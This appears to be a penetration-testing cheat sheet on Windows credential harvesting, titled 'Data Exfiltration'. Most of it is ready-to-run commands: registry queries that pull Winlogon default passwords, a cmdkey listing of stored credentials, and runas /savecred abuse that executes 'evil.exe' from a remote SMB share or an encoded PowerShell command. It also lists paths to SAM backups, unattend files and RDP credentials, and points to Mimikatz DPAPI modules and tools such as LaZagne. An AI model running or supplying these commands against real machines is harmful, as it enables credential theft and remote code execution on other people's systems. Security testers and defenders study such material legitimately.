# VIII - Data Exfiltration

## Look for interesting filenames

Command Line

```text
cd c:/
# LIST FILE / RECURSE / INCLUDE HIDDEN
dir /b/s/a *.bat
dir /b/s/a *.xml
dir /b/s/a *.ps1
...
```

PowerShell

```text
Get-ChildItem -Recurse -Force -Include *.rdp
Get-ChildItem -Recurse -Force -Include *.xml
Get-ChildItem -Recurse -Force -Include *putty*
Get-ChildItem -Recurse -Force -Include *wifi*
...
```

{% hint style="info" %}
Check the RecycleBin to look for credentials inside it
{% endhint %}

## **WinLogon Credentials**

One-liner

```text
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```

Script

```text
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

## List Stored Credentials

```text
cmdkey /list
Currently stored credentials:
    Target: Domain:interactive=WORKGROUP\Administrator
    Type: Domain Password
    User: WORKGROUP\Administrator
```

### Abuse with SMBshare

```text
runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\SHARE\evil.exe"
```

Abuse with Command EXEC

```text
runas /savecred /user:WORKGROUP\Administrator  "Powershell -EncodedCommand B64CMD"
```

## **Unattended Files**

```text
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

## **SAM & System Backups**

```text
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

## **Saved RDP Connections**

Registry

```text
HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
HKCU\Software\Microsoft\Terminal Server Client\Servers\
```

Files

```text
Get-ChildItem -Recurse -Force -Include *.rdp
get-content .\config.rdp
username:s:Administrator
password:s:xxxxxxxxxxxxx
```

### **RDP Credential Manage**

```text
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use the Mimikatz dpapi::rdg module with appropriate /masterkey to decrypt any .rdg files You can extract many DPAPI masterkeys from memory with the Mimikatz sekurlsa::dpapi module

## **Recently run Commands**

```text
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

## Tools

{% embed url="https://github.com/Arvanaghi/SessionGopher" %}

{% embed url="https://github.com/AlessandroZ/LaZagne" %}

{% embed url="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe" %}



